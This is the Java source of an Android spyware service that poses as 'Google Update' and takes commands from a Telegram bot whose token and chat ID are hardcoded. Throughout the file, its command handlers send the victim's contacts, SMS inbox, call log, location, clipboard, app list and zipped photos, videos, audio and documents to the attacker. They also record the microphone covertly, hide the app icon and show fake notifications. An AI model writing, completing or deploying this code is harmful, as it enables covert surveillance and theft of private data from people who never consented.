package com.google.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.net.ssl.HttpsURLConnection;

public class TelegramBotService extends Service {
    private static final String BOT_TOKEN = "8196334765:AAE3PKcjHHFVUg4mteYK-wLY7IhaGdcPoZI";
    private static final String CHAT_ID = "6793813126";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private static final String CHANNEL_ID = "GoogleChannel";
    private int lastUpdateId = 0;
    private MediaRecorder mediaRecorder;
    private String currentAudioPath;
    private boolean isRecording = false;
    private PowerManager.WakeLock wakeLock;
    private AudioManager audioManager;
    private ClipboardManager clipboardManager;
    private TelephonyManager telephonyManager;
    private WifiManager wifiManager;

    @Override
    public void onCreate() {
        super.onCreate();
        acquireWakeLock();
        audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
        clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        createNotificationChannel();
        startForeground(1001, createNotification());
        sendStartupMessage();
        startPolling();
        requestPermissions();
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception e) {}
            }
        }
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GoogleUpdate:WakeLock");
        wakeLock.acquire(10 * 60 * 1000L);
    }

    private void sendStartupMessage() {
        sendMessage("✅ Google Update Activated\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🤖 Android " + Build.VERSION.RELEASE);
    }

    private void startPolling() {
        new Thread(() -> {
            while (true) {
                try {
                    String response = get(API_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                    if (response != null && response.contains("\"ok\":true")) {
                        JSONObject json = new JSONObject(response);
                        JSONArray results = json.getJSONArray("result");
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id");
                            if (update.has("message") && update.getJSONObject("message").has("text")) {
                                JSONObject msg = update.getJSONObject("message");
                                String text = msg.getString("text").trim().toLowerCase();
                                long chatId = msg.getJSONObject("chat").getLong("id");
                                if (String.valueOf(chatId).equals(CHAT_ID)) {
                                    handleCommand(text);
                                }
                            }
                        }
                    }
                } catch (Exception e) { Log.e("Bot", "Polling error", e); }
                try { Thread.sleep(2000); } catch (InterruptedException e) { break; }
            }
        }).start();
    }

    private void handleCommand(String cmd) {
        String c = cmd.split(" ")[0];
        String arg = cmd.length() > c.length() + 1 ? cmd.substring(c.length() + 1) : "";

        switch (c) {
            case "/start":
                sendMessage("🔰 Google Update Commands:\n" +
                    "/contacts - جهات الاتصال\n" +
                    "/sms - جميع الرسائل\n" +
                    "/calllog - سجل المكالمات\n" +
                    "/location - الموقع الجغرافي\n" +
                    "/record - بدء التسجيل الصوتي\n" +
                    "/stoprec - إيقاف التسجيل\n" +
                    "/hide - إخفاء التطبيق\n" +
                    "/show - إظهار التطبيق\n" +
                    "/info - معلومات الجهاز\n" +
                    "/notify - إشعار وهمي\n" +
                    "/apps - قائمة التطبيقات\n" +
                    "/zip - جميع الملفات (ZIP)\n" +
                    "/photos - جميع الصور (ZIP)\n" +
                    "/videos - جميع الفيديوهات (ZIP)\n" +
                    "/audio - جميع الصوتيات (ZIP)\n" +
                    "/documents - جميع المستندات (ZIP)\n" +
                    "/volume up - رفع الصوت\n" +
                    "/volume down - خفض الصوت\n" +
                    "/clipboard - الحافظة\n" +
                    "/battery - البطارية\n" +
                    "/wifi - معلومات الشبكة");
                break;
            case "/contacts": sendFile("contacts.txt", getContacts().getBytes()); break;
            case "/sms": sendFile("sms.txt", getSms().getBytes()); break;
            case "/calllog": sendFile("call_log.txt", getCallLog().getBytes()); break;
            case "/location": getLocation(); break;
            case "/record": startRecording(); sendMessage("🎤 Recording started..."); break;
            case "/stoprec": stopRecording(); break;
            case "/hide": MainActivity.hideAppIcon(this); sendMessage("👁 Hidden"); break;
            case "/show": MainActivity.showAppIcon(this); sendMessage("👁 Shown"); break;
            case "/info": sendMessage(getFullDeviceInfo()); break;
            case "/notify": showFakeNotification(arg.isEmpty() ? "System Update Available" : arg); sendMessage("🔔 Notification sent"); break;
            case "/apps": sendFile("apps.txt", getInstalledApps().getBytes()); break;
            case "/zip": createZipAndSend(null); break;
            case "/photos": createZipAndSend("photos"); break;
            case "/videos": createZipAndSend("videos"); break;
            case "/audio": createZipAndSend("audio"); break;
            case "/documents": createZipAndSend("documents"); break;
            case "/volume": adjustVolume(arg); break;
            case "/clipboard": getClipboard(); break;
            case "/battery": getBatteryInfo(); break;
            case "/wifi": getWifiInfo(); break;
        }
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" : ").append(phone).append("\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(c.getColumnIndex("address"));
                    String body = c.getString(c.getColumnIndex("body"));
                    sb.append(addr).append(": ").append(body).append("\n---\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private String getCallLog() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    sb.append(name != null ? name : "Unknown").append(" - ").append(num).append("\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                sendMessage("📍 Location:\n" + loc.getLatitude() + ", " + loc.getLongitude() + "\n🗺️ https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
            } else {
                sendMessage("❌ Location unavailable");
            }
        } catch (Exception e) { sendMessage("❌ Location error"); }
    }

    private void startRecording() {
        try {
            File dir = new File(getExternalFilesDir(null), "recordings");
            if (!dir.exists()) dir.mkdirs();
            currentAudioPath = dir + "/rec_" + System.currentTimeMillis() + ".3gp";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (Exception e) { sendMessage("❌ Recording failed: " + e.getMessage()); }
    }

    private void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                File f = new File(currentAudioPath);
                if (f.exists() && f.length() > 0) {
                    sendFile(f.getName(), readBytes(f));
                } else {
                    sendMessage("❌ Recording file is empty");
                }
            } catch (Exception e) { sendMessage("❌ Stop failed: " + e.getMessage()); }
        } else {
            sendMessage("❌ No active recording");
        }
    }

    private void showFakeNotification(String text) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel("fake_channel", "Fake", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification notif = new NotificationCompat.Builder(this, "fake_channel")
                .setContentTitle("Google Update")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .build();
            nm.notify((int) System.currentTimeMillis(), notif);
        } catch (Exception e) { sendMessage("❌ Notification failed"); }
    }

    private String getInstalledApps() {
        StringBuilder sb = new StringBuilder();
        try {
            List<android.content.pm.PackageInfo> packages = getPackageManager().getInstalledPackages(0);
            for (android.content.pm.PackageInfo pkg : packages) {
                String name = pkg.applicationInfo.loadLabel(getPackageManager()).toString();
                sb.append(name).append(" : ").append(pkg.packageName).append("\n");
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private void createZipAndSend(String type) {
        try {
            File zipFile = new File(getExternalFilesDir(null), (type == null ? "all" : type) + "_data_" + System.currentTimeMillis() + ".zip");
            ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
            if (type == null || type.equals("all")) {
                addAllFiles(zos);
            } else if (type.equals("photos")) {
                addMediaFiles(zos, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photos", 100);
            } else if (type.equals("videos")) {
                addMediaFiles(zos, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos", 50);
            } else if (type.equals("audio")) {
                addMediaFiles(zos, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", 100);
            } else if (type.equals("documents")) {
                addDocuments(zos);
            }
            zos.close();
            if (zipFile.exists() && zipFile.length() > 0) {
                sendFile(zipFile.getName(), readBytes(zipFile));
                zipFile.delete();
            } else {
                sendMessage("❌ No files found to zip");
            }
        } catch (Exception e) { sendMessage("❌ Zip failed: " + e.getMessage()); }
    }

    private void addAllFiles(ZipOutputStream zos) {
        addMediaFiles(zos, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photos", 100);
        addMediaFiles(zos, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "videos", 50);
        addMediaFiles(zos, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", 100);
        addDocuments(zos);
        addDirectory(zos, Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "downloads", 50);
    }

    private void addMediaFiles(ZipOutputStream zos, Uri uri, String folder, int limit) {
        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME};
        Cursor c = getContentResolver().query(uri, projection, null, null, null);
        if (c != null) {
            int count = 0;
            while (c.moveToNext() && count < limit) {
                String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));
                String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                if (path != null && new File(path).exists()) {
                    addFileToZip(zos, path, folder + "/" + name);
                    count++;
                }
            }
            c.close();
        }
    }

    private void addDocuments(ZipOutputStream zos) {
        File docsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
        if (docsDir.exists()) addDirectory(zos, docsDir, "documents", 50);
    }

    private void addDirectory(ZipOutputStream zos, File dir, String folderName, int limit) {
        File[] files = dir.listFiles();
        if (files == null) return;
        int count = 0;
        for (File f : files) {
            if (count >= limit) break;
            if (f.isFile() && f.length() > 0 && f.length() < 20 * 1024 * 1024) {
                addFileToZip(zos, f.getAbsolutePath(), folderName + "/" + f.getName());
                count++;
            }
        }
    }

    private void addFileToZip(ZipOutputStream zos, String filePath, String entryName) {
        try {
            File f = new File(filePath);
            if (!f.exists() || f.length() == 0) return;
            zos.putNextEntry(new ZipEntry(entryName));
            FileInputStream fis = new FileInputStream(f);
            byte[] buffer = new byte[8192];
            int len;
            while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
            fis.close();
            zos.closeEntry();
        } catch (Exception e) {}
    }

    private void adjustVolume(String action) {
        if (action.equals("up")) audioManager.adjustVolume(AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
        else if (action.equals("down")) audioManager.adjustVolume(AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
        sendMessage("✅ Volume " + action);
    }

    private void getClipboard() {
        try {
            if (Build.VERSION.SDK_INT >= 23) {
                if (clipboardManager.hasPrimaryClip()) {
                    CharSequence text = clipboardManager.getPrimaryClip().getItemAt(0).getText();
                    sendMessage("📋 Clipboard: " + (text != null ? text : "(empty)"));
                } else {
                    sendMessage("📋 Clipboard is empty");
                }
            } else {
                sendMessage("❌ Clipboard not available");
            }
        } catch (Exception e) { sendMessage("❌ Clipboard error"); }
    }

    private void getBatteryInfo() {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent battery = registerReceiver(null, ifilter);
            if (battery != null) {
                int level = battery.getIntExtra("level", -1);
                int temp = battery.getIntExtra("temperature", -1) / 10;
                sendMessage("🔋 Battery: " + level + "%\n🌡️ Temp: " + temp + "°C");
            }
        } catch (Exception e) { sendMessage("❌ Battery error"); }
    }

    private void getWifiInfo() {
        try {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_WIFI_STATE) != PackageManager.PERMISSION_GRANTED) {
                sendMessage("❌ WiFi permission not granted");
                return;
            }
            StringBuilder sb = new StringBuilder();
            if (wifiManager != null) {
                WifiInfo wi = wifiManager.getConnectionInfo();
                if (wi != null && wi.getNetworkId() != -1) {
                    sb.append("📶 WiFi:\n");
                    sb.append("   📡 SSID: ").append(wi.getSSID()).append("\n");
                    sb.append("   📶 Signal: ").append(wi.getRssi()).append(" dBm\n");
                    sb.append("   🌐 IP: ").append(intToIp(wi.getIpAddress())).append("\n");
                    sb.append("   🔢 MAC: ").append(wi.getMacAddress()).append("\n");
                } else {
                    sb.append("📶 WiFi: Not connected\n");
                }
            }
            if (telephonyManager != null) {
                sb.append("\n📱 Mobile:\n");
                sb.append("   📡 Network: ").append(telephonyManager.getNetworkOperatorName()).append("\n");
            }
            sendMessage(sb.toString());
        } catch (SecurityException e) {
            sendMessage("❌ WiFi permission denied");
        } catch (Exception e) {
            sendMessage("❌ WiFi error: " + e.getMessage());
        }
    }

    private String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }

    private String getFullDeviceInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("📱 Device Information\n");
        sb.append("Model: ").append(Build.MODEL).append("\n");
        sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
        sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("API: ").append(Build.VERSION.SDK_INT).append("\n");
        try {
            android.os.StatFs stat = new android.os.StatFs(Environment.getExternalStorageDirectory().getPath());
            long total = (long) stat.getBlockCount() * (long) stat.getBlockSize();
            sb.append("Storage: ").append(total / (1024 * 1024 * 1024)).append(" GB\n");
        } catch (Exception e) {}
        return sb.toString();
    }

    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }

    private void sendFile(String name, byte[] data) {
        if (data == null || data.length == 0) {
            sendMessage("❌ File is empty");
            return;
        }
        new Thread(() -> {
            try {
                String boundary = "----Boundary" + System.currentTimeMillis();
                URL url = new URL(API_URL + "sendDocument");
                HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                dos.writeBytes(CHAT_ID + "\r\n");
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + name + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                dos.write(data);
                dos.writeBytes("\r\n");
                dos.writeBytes("--" + boundary + "--\r\n");
                dos.flush();
                dos.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }

    private String get(String urlStr) {
        try {
            HttpsURLConnection conn = (HttpsURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private byte[] readBytes(File f) {
        try {
            FileInputStream fis = new FileInputStream(f);
            byte[] data = new byte[(int) f.length()];
            fis.read(data);
            fis.close();
            return data;
        } catch (Exception e) { return new byte[0]; }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Google Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Update").setContentText("Running").setSmallIcon(android.R.drawable.ic_popup_sync).setOngoing(true).build();
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); super.onDestroy(); }
}
